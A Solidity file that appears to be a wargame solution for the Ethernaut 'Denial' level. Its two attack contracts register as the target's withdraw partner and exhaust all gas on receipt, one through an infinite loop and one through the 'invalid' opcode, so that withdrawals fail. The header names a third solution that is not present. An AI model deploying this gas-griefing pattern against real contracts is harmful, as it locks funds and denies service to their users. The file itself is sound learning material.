// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//   3 solution 
//   Hack ,Hack1  
//   Hack2 (<0.8.0 version only)

interface Denial 
{
    function setWithdrawPartner(address) external;
}
contract Hack
{
    constructor(Denial i)
    {
        i.setWithdrawPartner(address(this));
    }

    uint a;
    receive() external payable 
    { 
        while(true)
        {
            a=a+1; 
        }
    }
}



contract Hack2
{
    constructor(Denial i)
    {
        i.setWithdrawPartner(address(this));
    }
    receive() external payable 
    {
        assembly
        {
            invalid()      
        }
        //consume all gas  & txn fails   
        //we can't use assert(false) in version 0.8 because of update so assert does'nt consume all the gas in version 0.8 beacause now assert uses revert opcode that ive beeter gas managment
    }
}

